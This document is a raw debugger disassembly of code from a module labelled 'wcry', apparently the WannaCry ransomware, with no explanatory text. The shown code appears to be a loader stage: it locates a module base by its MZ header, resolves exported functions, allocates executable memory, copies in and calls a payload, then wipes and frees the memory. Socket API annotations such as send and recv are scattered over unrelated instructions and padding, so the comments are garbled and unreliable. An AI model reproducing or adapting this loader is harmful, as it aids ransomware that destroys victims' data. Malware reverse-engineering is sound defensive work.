00401A22        31C9                    XOR ECX,ECX
00401A24        8A0E                    MOV CL,BYTE PTR DS:[ESI]
00401A26        80F9 00                 CMP CL,0                                            ; /Flags
00401A29        74 0A                   JE SHORT wcry.00401A35
00401A2B        01C8                    ADD EAX,ECX
00401A2D        48                      DEC EAX
00401A2E        FFC6                    INC ESI
00401A30        48                      DEC EAX                                             ; \send
00401A31        FFC6                    INC ESI
00401A33      ^ EB E4                   JMP SHORT wcry.00401A19
00401A35        5F                      POP EDI
00401A36        59                      POP ECX
00401A37        5E                      POP ESI
00401A38        C3                      RETN
00401A39        56                      PUSH ESI
00401A3A        48                      DEC EAX
00401A3B        89C6                    MOV ESI,EAX
00401A3D        48                      DEC EAX
00401A3E        83C6 18                 ADD ESI,18                                          ; /Flags
00401A41        48                      DEC EAX
00401A42        31C0                    XOR EAX,EAX
00401A44        8B06                    MOV EAX,DWORD PTR DS:[ESI]                          ; |BufSize
00401A46        5E                      POP ESI
00401A47        C3                      RETN
00401A48        53                      PUSH EBX
00401A49        65:48                   DEC EAX                                             ; |Buffer
00401A4B        8B0425 38000000         MOV EAX,DWORD PTR DS:[38]                           ; \recv
00401A52        48                      DEC EAX
00401A53        8B40 04                 MOV EAX,DWORD PTR DS:[EAX+4]
00401A56        48                      DEC EAX
00401A57        C1E8 0C                 SHR EAX,0C
00401A5A        48                      DEC EAX
00401A5B        C1E0 0C                 SHL EAX,0C
00401A5E        48                      DEC EAX
00401A5F        8B18                    MOV EBX,DWORD PTR DS:[EAX]
00401A61        66:81FB 4D5A            CMP BX,5A4D
00401A66        74 08                   JE SHORT wcry.00401A70
00401A68        48                      DEC EAX
00401A69        2D 00100000             SUB EAX,1000
00401A6E      ^ EB EE                   JMP SHORT wcry.00401A5E
00401A70        5B                      POP EBX
00401A71        C3                      RETN
00401A72        57                      PUSH EDI
00401A73        56                      PUSH ESI
00401A74        51                      PUSH ECX
00401A75        48                      DEC EAX
00401A76        31FF                    XOR EDI,EDI
00401A78        48                      DEC EAX
00401A79        89C6                    MOV ESI,EAX                                         ; |DataSize
00401A7B        48                      DEC EAX
00401A7C        31C0                    XOR EAX,EAX
00401A7E        8B04BA                  MOV EAX,DWORD PTR DS:[EDX+EDI*4]
00401A81        48                      DEC EAX
00401A82        01F0                    ADD EAX,ESI
00401A84        E8 40FFFFFF             CALL wcry.004019C9
00401A89        39C8                    CMP EAX,ECX
00401A8B        74 0E                   JE SHORT wcry.00401A9B
00401A8D        48                      DEC EAX
00401A8E        FFC7                    INC EDI                                             ; /Flags
00401A90        48                      DEC EAX                                             ; |
00401A91        39DF                    CMP EDI,EBX
00401A93        74 0B                   JE SHORT wcry.00401AA0
00401A95      ^ EB E4                   JMP SHORT wcry.00401A7B
00401A97        59                      POP ECX
00401A98        5E                      POP ESI
00401A99        5F                      POP EDI                                             ; |Buffer
00401A9A        C3                      RETN                                                ; |Socket
00401A9B        48                      DEC EAX                                             ; \recv
00401A9C        89F8                    MOV EAX,EDI
00401A9E      ^ EB F7                   JMP SHORT wcry.00401A97
00401AA0        48                      DEC EAX
00401AA1        31C0                    XOR EAX,EAX
00401AA3      ^ EB F2                   JMP SHORT wcry.00401A97
00401AA5        56                      PUSH ESI
00401AA6        48                      DEC EAX
00401AA7        89C6                    MOV ESI,EAX
00401AA9        48                      DEC EAX
00401AAA        31C0                    XOR EAX,EAX
00401AAC        8B41 1C                 MOV EAX,DWORD PTR DS:[ECX+1C]
00401AAF        48                      DEC EAX
00401AB0        01F0                    ADD EAX,ESI
00401AB2        5E                      POP ESI
00401AB3        C3                      RETN
00401AB4        56                      PUSH ESI
00401AB5        48                      DEC EAX
00401AB6        89C6                    MOV ESI,EAX
00401AB8        48                      DEC EAX
00401AB9        31C0                    XOR EAX,EAX
00401ABB        8B41 20                 MOV EAX,DWORD PTR DS:[ECX+20]
00401ABE        48                      DEC EAX
00401ABF        01F0                    ADD EAX,ESI
00401AC1        5E                      POP ESI
00401AC2        C3                      RETN
00401AC3        56                      PUSH ESI
00401AC4        48                      DEC EAX
00401AC5        89C6                    MOV ESI,EAX
00401AC7        48                      DEC EAX
00401AC8        31C0                    XOR EAX,EAX
00401ACA        8B41 24                 MOV EAX,DWORD PTR DS:[ECX+24]
00401ACD        48                      DEC EAX
00401ACE        01F0                    ADD EAX,ESI
00401AD0        5E                      POP ESI                                             ; /Flags
00401AD1        C3                      RETN
00401AD2        48                      DEC EAX                                             ; |
00401AD3        D1E1                    SHL ECX,1
00401AD5        48                      DEC EAX
00401AD6        01C8                    ADD EAX,ECX                                         ; |
00401AD8        66:8B00                 MOV AX,WORD PTR DS:[EAX]
00401ADB        C3                      RETN                                                ; |
00401ADC        48                      DEC EAX
00401ADD        81CA 0000FFFF           OR EDX,FFFF0000
00401AE3        48                      DEC EAX
00401AE4        81F2 0000FFFF           XOR EDX,FFFF0000
00401AEA        48                      DEC EAX
00401AEB        C1E2 02                 SHL EDX,2
00401AEE        48                      DEC EAX
00401AEF        01D1                    ADD ECX,EDX
00401AF1        48                      DEC EAX
00401AF2        31D2                    XOR EDX,EDX
00401AF4        8B11                    MOV EDX,DWORD PTR DS:[ECX]
00401AF6        48                      DEC EAX
00401AF7        01D0                    ADD EAX,EDX
00401AF9        C3                      RETN                                                ; |
00401AFA        0000                    ADD BYTE PTR DS:[EAX],AL
00401AFC        0000                    ADD BYTE PTR DS:[EAX],AL
00401AFE        0000                    ADD BYTE PTR DS:[EAX],AL                            ; \send
00401B00        0000                    ADD BYTE PTR DS:[EAX],AL
00401B02        0000                    ADD BYTE PTR DS:[EAX],AL
00401B04        0000                    ADD BYTE PTR DS:[EAX],AL
00401B06        0000                    ADD BYTE PTR DS:[EAX],AL
00401B08        0000                    ADD BYTE PTR DS:[EAX],AL                            ; /Flags
00401B0A        0000                    ADD BYTE PTR DS:[EAX],AL                            ; |
00401B0C        0000                    ADD BYTE PTR DS:[EAX],AL
00401B0E        0000                    ADD BYTE PTR DS:[EAX],AL                            ; |BufSize
00401B10        0000                    ADD BYTE PTR DS:[EAX],AL
00401B12        0000                    ADD BYTE PTR DS:[EAX],AL
00401B14        0000                    ADD BYTE PTR DS:[EAX],AL                            ; |Socket
00401B16        0000                    ADD BYTE PTR DS:[EAX],AL
00401B18        0000                    ADD BYTE PTR DS:[EAX],AL
00401B1A        0000                    ADD BYTE PTR DS:[EAX],AL
00401B1C        0000                    ADD BYTE PTR DS:[EAX],AL
00401B1E        0000                    ADD BYTE PTR DS:[EAX],AL
00401B20        0000                    ADD BYTE PTR DS:[EAX],AL
00401B22        0000                    ADD BYTE PTR DS:[EAX],AL
00401B24        0000                    ADD BYTE PTR DS:[EAX],AL
00401B26        0000                    ADD BYTE PTR DS:[EAX],AL
00401B28        0000                    ADD BYTE PTR DS:[EAX],AL
00401B2A        0000                    ADD BYTE PTR DS:[EAX],AL
00401B2C        0000                    ADD BYTE PTR DS:[EAX],AL
00401B2E        0000                    ADD BYTE PTR DS:[EAX],AL
00401B30        0000                    ADD BYTE PTR DS:[EAX],AL
00401B32        0000                    ADD BYTE PTR DS:[EAX],AL
00401B34        0000                    ADD BYTE PTR DS:[EAX],AL
00401B36        0000                    ADD BYTE PTR DS:[EAX],AL
00401B38        0000                    ADD BYTE PTR DS:[EAX],AL
00401B3A        0000                    ADD BYTE PTR DS:[EAX],AL
00401B3C        0000                    ADD BYTE PTR DS:[EAX],AL                            ; /Socket
00401B3E        0000                    ADD BYTE PTR DS:[EAX],AL
00401B40        0000                    ADD BYTE PTR DS:[EAX],AL
00401B42        0000                    ADD BYTE PTR DS:[EAX],AL
00401B44        0000                    ADD BYTE PTR DS:[EAX],AL
00401B46        0000                    ADD BYTE PTR DS:[EAX],AL
00401B48        0000                    ADD BYTE PTR DS:[EAX],AL
00401B4A        0000                    ADD BYTE PTR DS:[EAX],AL
00401B4C        0000                    ADD BYTE PTR DS:[EAX],AL
00401B4E        0000                    ADD BYTE PTR DS:[EAX],AL
00401B50        0000                    ADD BYTE PTR DS:[EAX],AL                            ; /Socket
00401B52        0000                    ADD BYTE PTR DS:[EAX],AL
00401B54        0000                    ADD BYTE PTR DS:[EAX],AL
00401B56        0000                    ADD BYTE PTR DS:[EAX],AL
00401B58        0000                    ADD BYTE PTR DS:[EAX],AL
00401B5A        0000                    ADD BYTE PTR DS:[EAX],AL
00401B5C        0000                    ADD BYTE PTR DS:[EAX],AL
00401B5E        0000                    ADD BYTE PTR DS:[EAX],AL
00401B60        0000                    ADD BYTE PTR DS:[EAX],AL
00401B62        0000                    ADD BYTE PTR DS:[EAX],AL
00401B64        0000                    ADD BYTE PTR DS:[EAX],AL
00401B66        0000                    ADD BYTE PTR DS:[EAX],AL
00401B68        0000                    ADD BYTE PTR DS:[EAX],AL
00401B6A        0000                    ADD BYTE PTR DS:[EAX],AL
00401B6C        0000                    ADD BYTE PTR DS:[EAX],AL
00401B6E        0000                    ADD BYTE PTR DS:[EAX],AL
00401B70        0000                    ADD BYTE PTR DS:[EAX],AL
00401B72        0000                    ADD BYTE PTR DS:[EAX],AL
00401B74        0000                    ADD BYTE PTR DS:[EAX],AL
00401B76        0000                    ADD BYTE PTR DS:[EAX],AL
00401B78        0000                    ADD BYTE PTR DS:[EAX],AL
00401B7A        0000                    ADD BYTE PTR DS:[EAX],AL
00401B7C        0000                    ADD BYTE PTR DS:[EAX],AL
00401B7E        0000                    ADD BYTE PTR DS:[EAX],AL
00401B80        0000                    ADD BYTE PTR DS:[EAX],AL
00401B82        0000                    ADD BYTE PTR DS:[EAX],AL
00401B84        0000                    ADD BYTE PTR DS:[EAX],AL
00401B86        0000                    ADD BYTE PTR DS:[EAX],AL
00401B88        0000                    ADD BYTE PTR DS:[EAX],AL
00401B8A        0000                    ADD BYTE PTR DS:[EAX],AL
00401B8C        0000                    ADD BYTE PTR DS:[EAX],AL
00401B8E        0000                    ADD BYTE PTR DS:[EAX],AL
00401B90        0000                    ADD BYTE PTR DS:[EAX],AL
00401B92        0000                    ADD BYTE PTR DS:[EAX],AL
00401B94        0000                    ADD BYTE PTR DS:[EAX],AL
00401B96        0000                    ADD BYTE PTR DS:[EAX],AL
00401B98        0000                    ADD BYTE PTR DS:[EAX],AL
00401B9A        0000                    ADD BYTE PTR DS:[EAX],AL
00401B9C        0000                    ADD BYTE PTR DS:[EAX],AL                            ; /pAddr
00401B9E        0000                    ADD BYTE PTR DS:[EAX],AL
00401BA0        0000                    ADD BYTE PTR DS:[EAX],AL
00401BA2        0000                    ADD BYTE PTR DS:[EAX],AL
00401BA4        0000                    ADD BYTE PTR DS:[EAX],AL
00401BA6        0000                    ADD BYTE PTR DS:[EAX],AL
00401BA8        0000                    ADD BYTE PTR DS:[EAX],AL
00401BAA        0000                    ADD BYTE PTR DS:[EAX],AL
00401BAC        0000                    ADD BYTE PTR DS:[EAX],AL
00401BAE        0000                    ADD BYTE PTR DS:[EAX],AL                            ; \ntohs
00401BB0        0000                    ADD BYTE PTR DS:[EAX],AL
00401BB2        0000                    ADD BYTE PTR DS:[EAX],AL
00401BB4        0000                    ADD BYTE PTR DS:[EAX],AL
00401BB6        2803                    SUB BYTE PTR DS:[EBX],AL
00401BB8        0000                    ADD BYTE PTR DS:[EAX],AL
00401BBA        2000                    AND BYTE PTR DS:[EAX],AL
00401BBC        0000                    ADD BYTE PTR DS:[EAX],AL
00401BBE        70 00                   JO SHORT wcry.00401BC0                              ; \socket
00401BC0        0000                    ADD BYTE PTR DS:[EAX],AL
00401BC2        0803                    OR BYTE PTR DS:[EBX],AL
00401BC4        0000                    ADD BYTE PTR DS:[EAX],AL
00401BC6        4C                      DEC ESP
00401BC7        0000                    ADD BYTE PTR DS:[EAX],AL
00401BC9        00C8                    ADD AL,CL
00401BCB        0200                    ADD AL,BYTE PTR DS:[EAX]
00401BCD        0001                    ADD BYTE PTR DS:[ECX],AL
00401BCF        0000                    ADD BYTE PTR DS:[EAX],AL
00401BD1        0082 E9438500           ADD BYTE PTR DS:[EDX+8543E9],AL
00401BD7        0000                    ADD BYTE PTR DS:[EAX],AL
00401BD9        0000                    ADD BYTE PTR DS:[EAX],AL
00401BDB        0000                    ADD BYTE PTR DS:[EAX],AL
00401BDD        008A DF010000           ADD BYTE PTR DS:[EDX+1DF],CL
00401BE3        0000                    ADD BYTE PTR DS:[EAX],AL
00401BE5        0053 55                 ADD BYTE PTR DS:[EBX+55],DL
00401BE8        57                      PUSH EDI
00401BE9        56                      PUSH ESI
00401BEA        41                      INC ECX
00401BEB        54                      PUSH ESP                                            ; |Data
00401BEC        41                      INC ECX
00401BED        55                      PUSH EBP
00401BEE        41                      INC ECX
00401BEF        56                      PUSH ESI
00401BF0        41                      INC ECX                                             ; |Socket
00401BF1        57                      PUSH EDI                                            ; \send
00401BF2        48                      DEC EAX
00401BF3        89E0                    MOV EAX,ESP
00401BF5        48                      DEC EAX
00401BF6        89E1                    MOV ECX,ESP
00401BF8        48                      DEC EAX
00401BF9        83E1 08                 AND ECX,8
00401BFC        48                      DEC EAX
00401BFD        29CC                    SUB ESP,ECX
00401BFF        48                      DEC EAX                                             ; /Flags
00401C00        81EC 00040000           SUB ESP,400
00401C06        E8 00000000             CALL wcry.00401C0B
00401C0B        5D                      POP EBP                                             ; |Socket
00401C0C        48                      DEC EAX                                             ; \recv
00401C0D        89E6                    MOV ESI,ESP
00401C0F        48                      DEC EAX
00401C10        8906                    MOV DWORD PTR DS:[ESI],EAX
00401C12        48                      DEC EAX
00401C13        81EC 00040000           SUB ESP,400
00401C19        48                      DEC EAX
00401C1A        8D3D D20E0000           LEA EDI,DWORD PTR DS:[ED2]                          ; /Flags
00401C20        49                      DEC ECX
00401C21        89F0                    MOV EAX,ESI                                         ; |Data
00401C23        48                      DEC EAX
00401C24        83C6 08                 ADD ESI,8
00401C27        48                      DEC EAX                                             ; \send
00401C28        31C9                    XOR ECX,ECX
00401C2A        8A0F                    MOV CL,BYTE PTR DS:[EDI]
00401C2C        84C9                    TEST CL,CL
00401C2E        74 3F                   JE SHORT wcry.00401C6F
00401C30        48                      DEC EAX
00401C31        FFC7                    INC EDI
00401C33        8B0F                    MOV ECX,DWORD PTR DS:[EDI]
00401C35        48                      DEC EAX                                             ; /Flags
00401C36        83C7 04                 ADD EDI,4
00401C39        8B17                    MOV EDX,DWORD PTR DS:[EDI]
00401C3B        48                      DEC EAX                                             ; |BufSize
00401C3C        83C7 04                 ADD EDI,4
00401C3F        84D2                    TEST DL,DL
00401C41        74 2C                   JE SHORT wcry.00401C6F                              ; |Socket
00401C43        E8 D40D0000             CALL wcry.00402A1C
00401C48        51                      PUSH ECX
00401C49        0FB60F                  MOVZX ECX,BYTE PTR DS:[EDI]
00401C4C        48                      DEC EAX
00401C4D        85C9                    TEST ECX,ECX
00401C4F        59                      POP ECX
00401C50        75 09                   JNZ SHORT wcry.00401C5B
00401C52        48                      DEC EAX
00401C53        85C0                    TEST EAX,EAX
00401C55        0F84 B90D0000           JE wcry.00402A14
00401C5B        48                      DEC EAX
00401C5C        8906                    MOV DWORD PTR DS:[ESI],EAX
00401C5E        48                      DEC EAX
00401C5F        83C6 08                 ADD ESI,8
00401C62        30C0                    XOR AL,AL
00401C64        48                      DEC EAX
00401C65        83C7 01                 ADD EDI,1
00401C68        3A47 04                 CMP AL,BYTE PTR DS:[EDI+4]                          ; |Socket
00401C6B      ^ 74 CC                   JE SHORT wcry.00401C39
00401C6D      ^ EB B8                   JMP SHORT wcry.00401C27                             ; |
00401C6F        4C                      DEC ESP
00401C70        89C6                    MOV ESI,EAX
00401C72        48                      DEC EAX                                             ; \send
00401C73        8925 3D0D0000           MOV DWORD PTR DS:[D3D],ESP
00401C79        48                      DEC EAX
00401C7A        892D 3E0D0000           MOV DWORD PTR DS:[D3E],EBP
00401C80        48                      DEC EAX                                             ; /Flags
00401C81        8935 3F0D0000           MOV DWORD PTR DS:[D3F],ESI
00401C87        90                      NOP
00401C88        E8 00000000             CALL wcry.00401C8D
00401C8D        59                      POP ECX                                             ; \recv
00401C8E        4D                      DEC EBP
00401C8F        31C9                    XOR ECX,ECX
00401C91        49                      DEC ECX
00401C92        89C8                    MOV EAX,ECX
00401C94        48                      DEC EAX
00401C95        31D2                    XOR EDX,EDX
00401C97        B2 01                   MOV DL,1
00401C99        48                      DEC EAX
00401C9A        8D0D 2E0D0000           LEA ECX,DWORD PTR DS:[D2E]
00401CA0        48                      DEC EAX
00401CA1        83EC 20                 SUB ESP,20
00401CA4        FF56 38                 CALL DWORD PTR DS:[ESI+38]
00401CA7        48                      DEC EAX                                             ; /Flags
00401CA8        83C4 20                 ADD ESP,20
00401CAB        49                      DEC ECX                                             ; |Data
00401CAC        B9 40000000             MOV ECX,40
00401CB1        0000                    ADD BYTE PTR DS:[EAX],AL                            ; |
00401CB3        0000                    ADD BYTE PTR DS:[EAX],AL
00401CB5        49                      DEC ECX
00401CB6        B8 00300000             MOV EAX,3000                                        ; |
00401CBB        0000                    ADD BYTE PTR DS:[EAX],AL
00401CBD        0000                    ADD BYTE PTR DS:[EAX],AL
00401CBF        48                      DEC EAX
00401CC0        31D2                    XOR EDX,EDX
00401CC2        8B95 5D0F0000           MOV EDX,DWORD PTR SS:[EBP+F5D]                      ; |
00401CC8        48                      DEC EAX                                             ; \send
00401CC9        31C9                    XOR ECX,ECX
00401CCB        48                      DEC EAX
00401CCC        83EC 20                 SUB ESP,20
00401CCF        FF56 08                 CALL DWORD PTR DS:[ESI+8]
00401CD2        48                      DEC EAX
00401CD3        83C4 20                 ADD ESP,20
00401CD6        48                      DEC EAX                                             ; /Flags
00401CD7        85C0                    TEST EAX,EAX
00401CD9        0F84 CF0C0000           JE wcry.004029AE
00401CDF        48                      DEC EAX
00401CE0        89C3                    MOV EBX,EAX
00401CE2        56                      PUSH ESI                                            ; |Socket
00401CE3        8B8D 5D0F0000           MOV ECX,DWORD PTR SS:[EBP+F5D]                      ; \recv
00401CE9        48                      DEC EAX
00401CEA        8D35 800E0000           LEA ESI,DWORD PTR DS:[E80]
00401CF0        48                      DEC EAX
00401CF1        89DF                    MOV EDI,EBX
00401CF3        F3:A4                   REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]
00401CF5        5E                      POP ESI
00401CF6        48                      DEC EAX
00401CF7        895E 48                 MOV DWORD PTR DS:[ESI+48],EBX
00401CFA        48                      DEC EAX
00401CFB        31C0                    XOR EAX,EAX
00401CFD        8B85 5D0F0000           MOV EAX,DWORD PTR SS:[EBP+F5D]
00401D03        48                      DEC EAX                                             ; |Data
00401D04        8946 50                 MOV DWORD PTR DS:[ESI+50],EAX
00401D07        48                      DEC EAX
00401D08        31C9                    XOR ECX,ECX                                         ; |Socket
00401D0A        8B8D 5D0F0000           MOV ECX,DWORD PTR SS:[EBP+F5D]
00401D10        48                      DEC EAX                                             ; |
00401D11        8D3D 590E0000           LEA EDI,DWORD PTR DS:[E59]
00401D17        31C0                    XOR EAX,EAX                                         ; |
00401D19        F3:AA                   REP STOS BYTE PTR ES:[EDI]
00401D1B        48                      DEC EAX
00401D1C        31C0                    XOR EAX,EAX
00401D1E        48                      DEC EAX                                             ; |
00401D1F        8946 58                 MOV DWORD PTR DS:[ESI+58],EAX
00401D22        48                      DEC EAX
00401D23        8946 60                 MOV DWORD PTR DS:[ESI+60],EAX
00401D26        48                      DEC EAX
00401D27        8946 68                 MOV DWORD PTR DS:[ESI+68],EAX
00401D2A        48                      DEC EAX
00401D2B        8D05 77090000           LEA EAX,DWORD PTR DS:[977]
00401D31        48                      DEC EAX
00401D32        8905 C4020000           MOV DWORD PTR DS:[2C4],EAX
00401D38        48                      DEC EAX                                             ; |
00401D39        8D05 71090000           LEA EAX,DWORD PTR DS:[971]
00401D3F        48                      DEC EAX
00401D40        8905 BE020000           MOV DWORD PTR DS:[2BE],EAX
00401D46        48                      DEC EAX
00401D47        8D05 78090000           LEA EAX,DWORD PTR DS:[978]
00401D4D        48                      DEC EAX                                             ; /Socket
00401D4E        8905 B8020000           MOV DWORD PTR DS:[2B8],EAX                          ; \closesocket
00401D54        48                      DEC EAX
00401D55        8D05 86090000           LEA EAX,DWORD PTR DS:[986]
00401D5B        48                      DEC EAX
00401D5C        8905 B2020000           MOV DWORD PTR DS:[2B2],EAX
00401D62        48                      DEC EAX                                             ; /Socket
00401D63        8D05 A7080000           LEA EAX,DWORD PTR DS:[8A7]                          ; \closesocket
00401D69        48                      DEC EAX
00401D6A        8905 AC020000           MOV DWORD PTR DS:[2AC],EAX
00401D70        55                      PUSH EBP
00401D71        48                      DEC EAX
00401D72        8D2D D6010000           LEA EBP,DWORD PTR DS:[1D6]
00401D78        48                      DEC EAX
00401D79        8B7E 48                 MOV EDI,DWORD PTR DS:[ESI+48]
00401D7C        E8 A3020000             CALL wcry.00402024
00401D81        48                      DEC EAX
00401D82        85C0                    TEST EAX,EAX
00401D84        0F85 13010000           JNZ wcry.00401E9D
00401D8A        E8 1A030000             CALL wcry.004020A9
00401D8F        48                      DEC EAX
00401D90        85C0                    TEST EAX,EAX
00401D92        0F84 05010000           JE wcry.00401E9D
00401D98        48                      DEC EAX
00401D99        8945 20                 MOV DWORD PTR SS:[EBP+20],EAX
00401D9C        48                      DEC EAX
00401D9D        8B7D 08                 MOV EDI,DWORD PTR SS:[EBP+8]
00401DA0        48                      DEC EAX
00401DA1        83C7 30                 ADD EDI,30
00401DA4        48                      DEC EAX
00401DA5        8B3F                    MOV EDI,DWORD PTR DS:[EDI]
00401DA7        48                      DEC EAX
00401DA8        8B45 20                 MOV EAX,DWORD PTR SS:[EBP+20]
00401DAB        48                      DEC EAX
00401DAC        29F8                    SUB EAX,EDI
00401DAE        48                      DEC EAX
00401DAF        8945 28                 MOV DWORD PTR SS:[EBP+28],EAX
00401DB2        E8 64030000             CALL wcry.0040211B
00401DB7        48                      DEC EAX
00401DB8        85C0                    TEST EAX,EAX
00401DBA        0F85 DD000000           JNZ wcry.00401E9D
00401DC0        E8 E6030000             CALL wcry.004021AB
00401DC5        48                      DEC EAX
00401DC6        85C0                    TEST EAX,EAX
00401DC8        0F85 CF000000           JNZ wcry.00401E9D
00401DCE        E8 4E050000             CALL wcry.00402321
00401DD3        48                      DEC EAX
00401DD4        85C0                    TEST EAX,EAX
00401DD6        0F85 C1000000           JNZ wcry.00401E9D
00401DDC        E8 57050000             CALL wcry.00402338
00401DE1        48                      DEC EAX
00401DE2        85C0                    TEST EAX,EAX
00401DE4        0F85 B3000000           JNZ wcry.00401E9D
00401DEA        E8 57060000             CALL wcry.00402446
00401DEF        48                      DEC EAX
00401DF0        85C0                    TEST EAX,EAX
00401DF2        0F85 A5000000           JNZ wcry.00401E9D
00401DF8        E8 BA060000             CALL wcry.004024B7
00401DFD        48                      DEC EAX
00401DFE        85C0                    TEST EAX,EAX
00401E00        0F85 97000000           JNZ wcry.00401E9D
00401E06        E8 C6070000             CALL wcry.004025D1
00401E0B        48                      DEC EAX
00401E0C        85C0                    TEST EAX,EAX
00401E0E        0F85 89000000           JNZ wcry.00401E9D
00401E14        48                      DEC EAX
00401E15        8B45 20                 MOV EAX,DWORD PTR SS:[EBP+20]
00401E18        48                      DEC EAX
00401E19        8946 70                 MOV DWORD PTR DS:[ESI+70],EAX
00401E1C        48                      DEC EAX
00401E1D        8B45 18                 MOV EAX,DWORD PTR SS:[EBP+18]
00401E20        48                      DEC EAX
00401E21        8946 78                 MOV DWORD PTR DS:[ESI+78],EAX
00401E24        5D                      POP EBP
00401E25        8B85 610F0000           MOV EAX,DWORD PTR SS:[EBP+F61]
00401E2B        8986 80000000           MOV DWORD PTR DS:[ESI+80],EAX
00401E31        48                      DEC EAX
00401E32        8B56 70                 MOV EDX,DWORD PTR DS:[ESI+70]
00401E35        48                      DEC EAX
00401E36        6342 3C                 ARPL WORD PTR DS:[EDX+3C],AX
00401E39        48                      DEC EAX
00401E3A        8D9C10 88000000         LEA EBX,DWORD PTR DS:[EAX+EDX+88]
00401E41        48                      DEC EAX
00401E42        85DB                    TEST EBX,EBX
00401E44        74 48                   JE SHORT wcry.00401E8E
00401E46        8B1B                    MOV EBX,DWORD PTR DS:[EBX]
00401E48        48                      DEC EAX
00401E49        01D3                    ADD EBX,EDX
00401E4B        837B 14 00              CMP DWORD PTR DS:[EBX+14],0
00401E4F        74 3D                   JE SHORT wcry.00401E8E
00401E51        8BBE 80000000           MOV EDI,DWORD PTR DS:[ESI+80]
00401E57        2B7B 10                 SUB EDI,DWORD PTR DS:[EBX+10]
00401E5A        3B7B 14                 CMP EDI,DWORD PTR DS:[EBX+14]
00401E5D        7F 2F                   JG SHORT wcry.00401E8E
00401E5F        8B4B 1C                 MOV ECX,DWORD PTR DS:[EBX+1C]
00401E62        48                      DEC EAX
00401E63        01D1                    ADD ECX,EDX
00401E65        8B04B9                  MOV EAX,DWORD PTR DS:[ECX+EDI*4]
00401E68        48                      DEC EAX
00401E69        01D0                    ADD EAX,EDX
00401E6B        48                      DEC EAX
00401E6C        83EC 20                 SUB ESP,20
00401E6F        4C                      DEC ESP
00401E70        8B46 50                 MOV EAX,DWORD PTR DS:[ESI+50]
00401E73        48                      DEC EAX
00401E74        8B56 48                 MOV EDX,DWORD PTR DS:[ESI+48]
00401E77        48                      DEC EAX
00401E78        B9 02000000             MOV ECX,2
00401E7D        0000                    ADD BYTE PTR DS:[EAX],AL
00401E7F        0000                    ADD BYTE PTR DS:[EAX],AL
00401E81        FFD0                    CALL EAX
00401E83        48                      DEC EAX
00401E84        83C4 20                 ADD ESP,20
00401E87        48                      DEC EAX
00401E88        8986 88000000           MOV DWORD PTR DS:[ESI+88],EAX
00401E8E        55                      PUSH EBP
00401E8F        48                      DEC EAX
00401E90        8D2D B8000000           LEA EBP,DWORD PTR DS:[B8]
00401E96        E8 28070000             CALL wcry.004025C3
00401E9B        EB 00                   JMP SHORT wcry.00401E9D
00401E9D        48                      DEC EAX
00401E9E        8B4D 78                 MOV ECX,DWORD PTR SS:[EBP+78]
00401EA1        48                      DEC EAX
00401EA2        85C9                    TEST ECX,ECX
00401EA4        74 0B                   JE SHORT wcry.00401EB1
00401EA6        48                      DEC EAX
00401EA7        83EC 20                 SUB ESP,20
00401EAA        FF56 40                 CALL DWORD PTR DS:[ESI+40]
00401EAD        48                      DEC EAX
00401EAE        83C4 20                 ADD ESP,20
00401EB1        48                      DEC EAX
00401EB2        8B7D 20                 MOV EDI,DWORD PTR SS:[EBP+20]
00401EB5        48                      DEC EAX
00401EB6        85FF                    TEST EDI,EDI
00401EB8        0F84 8A000000           JE wcry.00401F48
00401EBE        4C                      DEC ESP
00401EBF        8D8D AA000000           LEA ECX,DWORD PTR SS:[EBP+AA]
00401EC5        49                      DEC ECX
00401EC6        B8 40000000             MOV EAX,40
00401ECB        0000                    ADD BYTE PTR DS:[EAX],AL
00401ECD        0000                    ADD BYTE PTR DS:[EAX],AL
00401ECF        48                      DEC EAX
00401ED0        8B55 50                 MOV EDX,DWORD PTR SS:[EBP+50]
00401ED3        48                      DEC EAX
00401ED4        8B4D 20                 MOV ECX,DWORD PTR SS:[EBP+20]
00401ED7        48                      DEC EAX
00401ED8        83EC 20                 SUB ESP,20
00401EDB        FF56 30                 CALL DWORD PTR DS:[ESI+30]
00401EDE        48                      DEC EAX
00401EDF        83C4 20                 ADD ESP,20
00401EE2        48                      DEC EAX
00401EE3        85C0                    TEST EAX,EAX
00401EE5        74 09                   JE SHORT wcry.00401EF0
00401EE7        48                      DEC EAX
00401EE8        8B4D 50                 MOV ECX,DWORD PTR SS:[EBP+50]
00401EEB        48                      DEC EAX
00401EEC        31C0                    XOR EAX,EAX
00401EEE        F3:AA                   REP STOS BYTE PTR ES:[EDI]
00401EF0        49                      DEC ECX
00401EF1        B8 00800000             MOV EAX,8000
00401EF6        0000                    ADD BYTE PTR DS:[EAX],AL
00401EF8        0000                    ADD BYTE PTR DS:[EAX],AL
00401EFA        48                      DEC EAX
00401EFB        BA 00000000             MOV EDX,0
00401F00        0000                    ADD BYTE PTR DS:[EAX],AL
00401F02        0000                    ADD BYTE PTR DS:[EAX],AL
00401F04        48                      DEC EAX
00401F05        8B4D 20                 MOV ECX,DWORD PTR SS:[EBP+20]
00401F08        48                      DEC EAX
00401F09        83EC 20                 SUB ESP,20
00401F0C        FF56 10                 CALL DWORD PTR DS:[ESI+10]
00401F0F        48                      DEC EAX
00401F10        83C4 20                 ADD ESP,20
00401F13        48                      DEC EAX
00401F14        8B7D 60                 MOV EDI,DWORD PTR SS:[EBP+60]
00401F17        48                      DEC EAX
00401F18        85FF                    TEST EDI,EDI
00401F1A        74 2C                   JE SHORT wcry.00401F48
00401F1C        48                      DEC EAX
00401F1D        8B4D 68                 MOV ECX,DWORD PTR SS:[EBP+68]
00401F20        48                      DEC EAX
00401F21        31C0                    XOR EAX,EAX
00401F23        F3:AA                   REP STOS BYTE PTR ES:[EDI]
00401F25        49                      DEC ECX
00401F26        B8 00800000             MOV EAX,8000
00401F2B        0000                    ADD BYTE PTR DS:[EAX],AL
00401F2D        0000                    ADD BYTE PTR DS:[EAX],AL
00401F2F        48                      DEC EAX
00401F30        BA 00000000             MOV EDX,0
00401F35        0000                    ADD BYTE PTR DS:[EAX],AL
00401F37        0000                    ADD BYTE PTR DS:[EAX],AL
00401F39        48                      DEC EAX
00401F3A        8B4D 60                 MOV ECX,DWORD PTR SS:[EBP+60]
00401F3D        48                      DEC EAX
00401F3E        83EC 20                 SUB ESP,20
00401F41        FF56 10                 CALL DWORD PTR DS:[ESI+10]
00401F44        48                      DEC EAX
00401F45        83C4 20                 ADD ESP,20
00401F48        5D                      POP EBP
00401F49        E9 600A0000             JMP wcry.004029AE
00401F4E        0000                    ADD BYTE PTR DS:[EAX],AL
00401F50        0000                    ADD BYTE PTR DS:[EAX],AL
